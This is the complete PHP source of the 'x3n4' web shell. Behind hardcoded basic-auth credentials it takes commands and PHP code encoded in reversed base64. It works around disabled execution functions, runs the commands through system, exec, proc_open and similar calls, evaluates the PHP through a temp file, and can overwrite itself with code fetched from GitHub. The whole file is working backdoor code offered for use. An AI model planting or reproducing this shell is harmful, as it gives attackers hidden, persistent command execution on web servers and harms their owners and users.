<?php

define('X3N4_VERSION', 'v1.0');
define('X3N4_ENCRYPTION_ALGORITHM', 'rb64');

$user = 'x3n4';
$password = 'P455W0rd';

/**
 * Functions
 */
function get_shell_prefix()
{
    return get_user() . '@' . php_uname('n') . ':' . getcwd() . ' $ ';
}
function get_shell_command()
{
    static $shell_command;

    if ($shell_command === null) {
        if (is_function_available('system')) {
            $shell_command = 'system';
        } elseif (is_function_available('shell_exec')) {
            $shell_command = 'shell_exec';
        } elseif (is_function_available('exec')) {
            $shell_command = 'exec';
        } elseif (is_function_available('passthru')) {
            $shell_command = 'passthru';
        } elseif (is_function_available('proc_open')) {
            $shell_command = 'proc_open';
        } elseif (is_function_available('popen')) {
            $shell_command = 'popen';
        }
    }

    return $shell_command;
}
function execute_command($command)
{
    $command .= ' 2>&1';
    switch (get_shell_command()) {
        case 'system':
            ob_start();
            @system($command);
            $output = ob_get_contents();
            ob_end_clean();
            return $output;

        case 'shell_exec':
            return @shell_exec($command);

        case 'exec':
            @exec($command, $outputArr, $code);
            return implode(PHP_EOL, $outputArr);

        case 'passthru':
            ob_start();
            @passthru($command, $code);
            $output = ob_get_contents();
            ob_end_clean();
            return $output;

        case 'proc_open':
            $descriptors = array(
                0 => array('pipe', 'r'),
                1 => array('pipe', 'w'),
                2 => array('pipe', 'w')
            );

            $process = proc_open($command, $descriptors, $pipes, getcwd());

            fclose($pipes[0]);
            $output = stream_get_contents($pipes[1]);
            fclose($pipes[1]);
            $error = stream_get_contents($pipes[2]);
            fclose($pipes[2]);
            $code = proc_close($process);

            return $output;

        case 'popen':
            $process = popen($command, 'r');
            $output = fread($process, 4096);
            pclose($process);
            return $output;

        default:
            return 'None available function to run your command, sorry. :(';
    }
}
function disabled_functions()
{
    static $disabled_fn;

    if ($disabled_fn === null) {
        $df = ini_get('disable_functions');
        $shfb = ini_get('suhosin.executor.func.blacklist');
        $fn_list = array_map('trim', explode(',', "$df,$shfb"));
        $disabled_fn = array_filter($fn_list, create_function('$value', 'return $value !== "";'));
    }

    return $disabled_fn;
}
function is_function_available($function)
{
    return is_callable($function) && !in_array($function, disabled_functions());
}
function output_json($output = '')
{
    if (is_array($output)) {
        $output_data = $output;
    } else {
        $output_data = array(
            'pwd' => empty($_SESSION['pwd']) ? getcwd() : $_SESSION['pwd'],
            'banner' => get_shell_prefix(),
            'stdout' => $output
        );
    }
    if (is_callable('json_encode')) {
        header('Content-Type: text/plain;');
        echo encrypt(json_encode($output_data));
    } else {
        echo encrypt($output_data['banner'] . ' ' . $_REQUEST['cmd'] . PHP_EOL . $output);
    }
    session_write_close();
    exit(0);
}
function require_auth($user, $password)
{
    $AUTH_USER = $user;
    $AUTH_PASS = $password;
    header('Cache-Control: no-cache, must-revalidate, max-age=0');
    $has_supplied_credentials = !(empty($_SERVER['PHP_AUTH_USER']) && empty($_SERVER['PHP_AUTH_PW']));
    $is_not_authenticated = (
        !$has_supplied_credentials ||
        $_SERVER['PHP_AUTH_USER'] != $AUTH_USER ||
        $_SERVER['PHP_AUTH_PW']   != $AUTH_PASS
    );
    if ($is_not_authenticated) {
        header('HTTP/1.1 401 Authorization Required');
        header('WWW-Authenticate: Basic realm="Access denied"');
        exit;
    }
}
function get_motd()
{
    $command = null;

    switch (true) {
        case stristr(PHP_OS, 'DAR'): $command = 'sw_vers'; break;
        case stristr(PHP_OS, 'WIN'): $command = 'ver'; break;
        case stristr(PHP_OS, 'LINUX'): $command = 'cat /etc/motd'; break;
        default: $command = '';
    }
    if (!empty($command)) {
        return execute_command($command);
    }

    return 'Welcome to x3n4 '.X3N4_VERSION;
}
function encrypt($input)
{
    switch (X3N4_ENCRYPTION_ALGORITHM) {
        case 'b64':
            return base64_encode($input);

        case 'rb64':
            return strrev(base64_encode($input));
    }
    return $input;
}
function decrypt($input)
{
    switch (X3N4_ENCRYPTION_ALGORITHM) {
        case 'b64':
            return base64_decode($input);

        case 'rb64':
            return base64_decode(strrev($input));
    }
    return $input;
}
function get_user()
{
    if (
        is_function_available('posix_getpwuid') &&
        is_function_available('posix_getpid')
    ) {
        $info = posix_getpwuid(posix_getuid());
        return $info['name'];
    }
    return getenv('USERNAME') ? getenv('USERNAME') : getenv('USER');
}
function better_eval($code)
{
    $temp = tmpfile();
    $file = stream_get_meta_data($temp);
    $file = $file['uri'];
    fwrite($temp, $code);
    ob_start();
    include($file);
    $output = ob_get_contents();
    ob_get_clean();
    fclose($temp);
    if (file_exists($file)) {
        unlink($file);
    }
    return $output;
}

/**
 * CORE
 */
require_auth($user, $password);
session_start();

if (!empty($_SESSION['pwd'])) {
    chdir($_SESSION['pwd']);
}

if (isset($_REQUEST['cmd'])) {
    $REQUESTED_CMD = trim(decrypt($_REQUEST['cmd']));
    if (empty($REQUESTED_CMD)) {
        exit(0);
    }
    if ($REQUESTED_CMD == 'upgrade') {
        $options  = array('http' => array('user_agent' => 'custom user agent string'));
        $context  = stream_context_create($options);
        $releases = @json_decode(@file_get_contents('https://api.github.com/repos/jorge-matricali/x3n4/releases', false, $context));
        if ($releases) {
            $asset = $releases[0]->assets[0]->browser_download_url;
            if ($asset) {
                file_put_contents(__FILE__.'.backup.php', file_get_contents(__FILE__));
                file_put_contents(__FILE__, file_get_contents($asset, false, $context));
            }
        }
        output_json('--- PLEASE REFRESH YOUR BROWSER :D ---');
        exit(0);
    }
    if ($REQUESTED_CMD == 'exit') {
        session_destroy();
        exit(0);
    }
    if (substr($REQUESTED_CMD, 0, 3) === 'cd ') {
        $dir = substr($REQUESTED_CMD, 3);
        $dir = realpath($dir);
        if (chdir($dir)) {
            $_SESSION['pwd'] = $dir;
            output_json();
        }
    }

    $output = execute_command($REQUESTED_CMD);
    output_json($output);
}

/**
 * PHP Eval
 */
if (isset($_REQUEST['eval'])) {
    $code = decrypt($_REQUEST['eval']);
    $t1 = microtime(true);
    $output = better_eval($code);
    $t2 = microtime(true);
    output_json(array(
        'stdout' => $output,
        'took' => round($t2 - $t1, 2),
    ));
}
